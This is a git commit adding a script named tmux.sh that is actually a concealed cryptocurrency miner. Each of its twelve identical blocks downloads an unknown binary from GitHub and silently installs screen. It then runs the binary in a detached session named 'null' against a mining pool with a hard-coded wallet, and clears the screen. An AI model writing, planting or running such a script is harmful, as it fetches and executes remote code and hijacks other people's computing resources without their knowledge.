85022f7c7e8ae7577e48b7f2b5fadb105999c50a
obisumila <obisumila@gmail.com>
2024-09-24 07:20:52 +0800

    Add files via upload

---
+++ tmux.sh
@@ -0,0 +1,119 @@
+wget https://github.com/obisumila/fictional-fishstick/raw/refs/heads/main/pilatex ;
+chmod +x pilatex ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./pilatex --url ws://ore.tw-pool.com:5487/mine mine --username 9RqzsngWbSBwZwPk84AkV83tsDNQQJipD1BEfFNugMHD.WHITE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/fictional-fishstick/raw/refs/heads/main/pilatex ;
+chmod +x pilatex ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./pilatex --url ws://ore.tw-pool.com:5487/mine mine --username 9RqzsngWbSBwZwPk84AkV83tsDNQQJipD1BEfFNugMHD.WHITE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/fictional-fishstick/raw/refs/heads/main/pilatex ;
+chmod +x pilatex ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./pilatex --url ws://ore.tw-pool.com:5487/mine mine --username 9RqzsngWbSBwZwPk84AkV83tsDNQQJipD1BEfFNugMHD.WHITE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/fictional-fishstick/raw/refs/heads/main/pilatex ;
+chmod +x pilatex ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./pilatex --url ws://ore.tw-pool.com:5487/mine mine --username 9RqzsngWbSBwZwPk84AkV83tsDNQQJipD1BEfFNugMHD.WHITE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/fictional-fishstick/raw/refs/heads/main/pilatex ;
+chmod +x pilatex ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./pilatex --url ws://ore.tw-pool.com:5487/mine mine --username 9RqzsngWbSBwZwPk84AkV83tsDNQQJipD1BEfFNugMHD.WHITE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/fictional-fishstick/raw/refs/heads/main/pilatex ;
+chmod +x pilatex ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./pilatex --url ws://ore.tw-pool.com:5487/mine mine --username 9RqzsngWbSBwZwPk84AkV83tsDNQQJipD1BEfFNugMHD.WHITE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/fictional-fishstick/raw/refs/heads/main/pilatex ;
+chmod +x pilatex ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./pilatex --url ws://ore.tw-pool.com:5487/mine mine --username 9RqzsngWbSBwZwPk84AkV83tsDNQQJipD1BEfFNugMHD.WHITE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/fictional-fishstick/raw/refs/heads/main/pilatex ;
+chmod +x pilatex ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./pilatex --url ws://ore.tw-pool.com:5487/mine mine --username 9RqzsngWbSBwZwPk84AkV83tsDNQQJipD1BEfFNugMHD.WHITE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/fictional-fishstick/raw/refs/heads/main/pilatex ;
+chmod +x pilatex ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./pilatex --url ws://ore.tw-pool.com:5487/mine mine --username 9RqzsngWbSBwZwPk84AkV83tsDNQQJipD1BEfFNugMHD.WHITE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/fictional-fishstick/raw/refs/heads/main/pilatex ;
+chmod +x pilatex ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./pilatex --url ws://ore.tw-pool.com:5487/mine mine --username 9RqzsngWbSBwZwPk84AkV83tsDNQQJipD1BEfFNugMHD.WHITE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/fictional-fishstick/raw/refs/heads/main/pilatex ;
+chmod +x pilatex ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./pilatex --url ws://ore.tw-pool.com:5487/mine mine --username 9RqzsngWbSBwZwPk84AkV83tsDNQQJipD1BEfFNugMHD.WHITE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/fictional-fishstick/raw/refs/heads/main/pilatex ;
+chmod +x pilatex ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S null -dm ./pilatex --url ws://ore.tw-pool.com:5487/mine mine --username 9RqzsngWbSBwZwPk84AkV83tsDNQQJipD1BEfFNugMHD.WHITE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
